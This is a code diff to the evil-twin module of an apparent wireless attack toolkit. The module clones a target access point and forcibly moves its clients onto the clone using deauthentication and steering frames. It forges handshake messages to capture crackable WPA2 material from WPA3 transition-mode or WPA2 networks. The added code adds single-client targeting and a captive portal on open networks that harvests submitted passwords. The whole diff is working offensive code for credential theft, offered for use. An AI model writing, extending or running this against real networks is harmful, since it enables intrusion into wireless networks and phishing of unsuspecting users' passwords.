@@ -1,10 +1,13 @@
-"""EvilTwin: downgrade attack against WPA3/SAE transition-mode APs. Punt the client onto a WPA2-PSK
-twin so it re-associates with PSK (a crackable M2) instead of SAE.
+"""EvilTwin: clone a target AP and punt its clients onto the twin. Against a WPA3/SAE
+transition-mode (or plain WPA2) target, the twin is WPA2-PSK-only and forges M1 to capture a
+crackable M2. Against an open target, the twin is open too; there's no 4-way, so the goal is
+just a client associating to us (see ``secured``).
 """
 from __future__ import annotations
 
 import asyncio
 import logging
+import sys
 from dataclasses import dataclass
 from typing import Optional
 
@@ -13,8 +16,10 @@ from wifit3.dot11.ap import beacon_clone
 from wifit3.dot11.csa import build_csa_beacon
 from wifit3.crack.handshake import crackable_pairs, pmkid_crackable
 from wifit3.campaigns.campaign import Campaign
-from wifit3.campaigns.eviltwin.fake_ap import FakeAP
+from wifit3.campaigns.eviltwin.fake_ap import FakeAP, ClientPhase
+from wifit3.campaigns.eviltwin.portal import PortalStack
 from wifit3.campaigns.eviltwin.punter import Punter, PuntMode, BURST_SIZE, FRAME_GAP_SEC
+from wifit3.net.portal_templates import PortalTemplate
 
 logger = logging.getLogger(__name__)
 
@@ -50,6 +55,9 @@ class EvilTwinInput:
     csa_channel: Optional[int] = None        # None resolves off the twin channel (see _make_punter)
     punt_period_sec: Optional[float] = 30.0  # None never punts (host only)
     punt_once: bool = False
+    target_client: Optional[str] = None      # None = every client on the target; else steer/deauth just this MAC
+    ip_layer: bool = False                   # open targets only: bring up the TAP+DHCP+DNS+HTTP stack
+    portal_template: PortalTemplate = PortalTemplate.PASSWORD
 
 
 class EvilTwinCampaign(Campaign):
@@ -62,7 +70,7 @@ class EvilTwinCampaign(Campaign):
 
     @classmethod
     def visible(cls, ap) -> bool:
-        return bool(ap.ssid) and bool(ap.akm_suites)
+        return bool(ap.ssid) and (bool(ap.akm_suites) or (ap.encryption or "").upper() == "OPEN")
 
     @classmethod
     def ineligible_reason(cls, ap) -> Optional[str]:
@@ -85,12 +93,20 @@ class EvilTwinCampaign(Campaign):
         self.same_bssid = self.twin_bssid == target.bssid
         self.punt_period_sec = evil_input.punt_period_sec
         self.punt_once = evil_input.punt_once
+        self.secured = bool(target.akm_suites)   # False: open target, no 4-way to forge or wait on
+        self.target_client = (evil_input.target_client or "").lower() or None
+        self._ip_layer_enabled = evil_input.ip_layer
+        self.portal_template = evil_input.portal_template
         self.real_beacon = target.last_beacon_frame
         self.twin_beacon = beacon_clone(self.real_beacon, self.twin_channel,
                                         None if self.same_bssid else str_to_mac(self.twin_bssid))
         self.punter = self._make_punter(evil_input, target.bssid)
         self.fakeap: Optional[FakeAP] = None
         self.captured = False
+        self.client_joined = False   # open twins only: informational, never a stop signal
+        self.portal: Optional[PortalStack] = None
+        self.ip_layer_error: Optional[str] = None   # set when the IP layer couldn't come up
+        self.portal_submissions: list[dict] = []     # harvested form submissions, newest last
 
     def _make_punter(self, evil_input: EvilTwinInput, target_bssid: str) -> Optional[Punter]:
         if not evil_input.punt_modes:
@@ -102,19 +118,24 @@ class EvilTwinCampaign(Campaign):
     async def _loop(self) -> None:
         self.fakeap = FakeAP(self.twin_iface, str_to_mac(self.twin_bssid), self.ssid,
                              self.twin_channel, self.twin_beacon, rx_source=self.twin_iface,
-                             record_m1=self.array.record_injected_eapol)
+                             record_m1=self.array.record_injected_eapol, secured=self.secured,
+                             target_client=str_to_mac(self.target_client) if self.target_client else None)
         if self.same_bssid:
             self.array.ignore_stray_beacons(self.twin_bssid, self.twin_channel)
         else:
             self.array.mark_evil_twin(self.twin_bssid)
         await self.fakeap.start()
+        if not self.secured and self._ip_layer_enabled:
+            await self._start_ip_layer()
         if (self.punt_iface is not self.twin_iface
                 and self.punt_iface.current_channel != self.target_channel):
             await self.punt_iface.set_channel(self.target_channel)
 
         punted = False
         while not self.stopped:
-            if self._has_crackable_capture():
+            if not self.secured:
+                self._note_open_joins()          # informational only: open twins never auto-stop
+            elif self._has_crackable_capture():
                 self.captured = True
                 break
             if self._should_punt(punted):
@@ -123,7 +144,10 @@ class EvilTwinCampaign(Campaign):
             await self._sleep_between_bursts(self.punt_period_sec or _POLL_SEC)
 
     def _target_clients(self) -> list[bytes]:
-        """MACs associated to the real target AP: the STAs a BTM punt steers to the twin."""
+        """MACs a per-client punt (BTM / unicast deauth) steers to the twin: just ``target_client``
+        when single-client targeting is on, else every STA associated to the real target AP."""
+        if self.target_client:
+            return [str_to_mac(self.target_client)]
         target = self.ap.bssid.lower()
         return [str_to_mac(c.mac) for c in self.array.clients.values()
                 if (c.bssid or "").lower() == target]
@@ -149,13 +173,38 @@ class EvilTwinCampaign(Campaign):
                 return True
         return False
 
+    def _note_open_joins(self) -> None:
+        """Open twin: a joined client must stay associated, so this is never a stop signal, just
+        something the UI reads back."""
+        if not self.client_joined and self.fakeap is not None and any(
+                c.phase >= ClientPhase.ASSOCED for c in self.fakeap.stats.clients.values()):
+            self.client_joined = True
+
+    async def _start_ip_layer(self) -> None:
+        """Best-effort: an open twin still works at the association level (today's behavior) if
+        this fails, so a failure here is logged, never raised."""
+        if not sys.platform.startswith("linux"):
+            self.ip_layer_error = "no IP layer yet on this platform (Linux only for now)"
+            return
+        stack = PortalStack(self.twin_iface, str_to_mac(self.twin_bssid), self.ssid,
+                            template=self.portal_template, on_submit=self.portal_submissions.append)
+        try:
+            await stack.start()
+        except Exception as exc:                                    # noqa: BLE001
+            logger.warning("eviltwin: IP layer did not come up: %s", exc)
+            self.ip_layer_error = str(exc)
+            return
+        self.portal = stack
+
     async def teardown(self) -> None:
         if self.fakeap is None:
             return
         try:
-            await self.fakeap.stop()      # stop the WPA2 beacon + responder first
+            await self.fakeap.stop()      # stop the twin's beacon + responder first
             await self._csa_return()      # then announce the switch-back, uninterleaved
         finally:
+            if self.portal is not None:
+                await self.portal.stop()
             if self.same_bssid:
                 self.array.stop_ignoring_stray_beacons(self.twin_bssid)
             await self.twin_iface.set_channel(self.target_channel)
